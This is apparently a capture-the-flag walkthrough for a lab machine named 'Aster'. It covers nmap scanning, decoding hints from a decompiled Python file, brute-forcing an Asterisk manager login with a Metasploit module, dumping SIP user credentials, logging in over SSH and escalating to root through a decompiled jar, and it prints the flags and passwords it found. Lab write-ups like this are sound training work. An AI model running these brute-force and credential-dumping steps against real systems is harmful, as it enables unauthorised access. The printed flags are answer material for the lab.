> Aster 

export IP=10.10.100.77

# Nmap

sudo nmap -A -sC -sV -T4 -vv -Pn -p- -O -oN nmap/initial $IP

```
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
1720/tcp open  h323q931?   syn-ack
2000/tcp open  cisco-sccp? syn-ack
```

We have a .pyc file at port 80 and we can convert it to python file using `uncompyle6 output.pyc > output.py`. And now inspecting the program it is not malicious just uses pyfiglet to print out text. We have some encoded text there on changing the program a bit we have the text.

```
import pyfiglet
oO00oOo = '476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e'
OOOo0 = bytes.fromhex(oO00oOo)
Oooo000o = OOOo0.decode('ASCII')
print(Oooo000o)
Oo = '476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21'
I1Ii11I1Ii1i = bytes.fromhex(Oo)
Ooo = I1Ii11I1Ii1i.decode('ASCII')
print(Ooo)
```

Or we can just take the encrypted text and put it in cyberchef then decode as hex.

## Output

```
Good job, user "admin" the open source framework for building communications, installed in the server.
Good job reverser, python is very cool!Good job reverser, python is very cool!Good job reverser, python is very cool!
```

I found an exploit in metasploit for asterisk.

# Metasploit

```
sudo msfconsole
use auxiliary/voip/asterisk_login
show options
set username admin
set rhosts $IP
set stop_on_success true
run
```

And we have a hit!!

`[+] 10.10.100.77:5038     - User: "admin" using pass: "abc123" - can login on 10.10.100.77:5038!`

And we can connect through telnet but we have specific syntax.

```
action: login
username:admin
secret: abc123
```

## Listing the users 

`action:command
command: sip show users`

# Output

```
Output: Username                   Secret           Accountcode      Def.Context      ACL  Forcerport
Output: 100                        100                               test             No   No        
Output: 101                        101                               test             No   No        
Output: harry                      p4ss#w0rd!#                       test             No   No
```

Let's try SSH using harry. Yep! we are in!

# user.txt

```
thm{bas1c_aster1ck_explotat1on}
```

# Privilege Escalation

Now we have `Example_Root.jar`. Let's change it to our system using python server. Now uploading this in an online decompiler `http://www.javadecompilers.com` we see the code. We just ahve to decode the file.

In attacking machine run

```
java -jar Example_Root.jar
```

Now we have root.txt

# root.txt

```
thm{fa1l_revers1ng_java}
```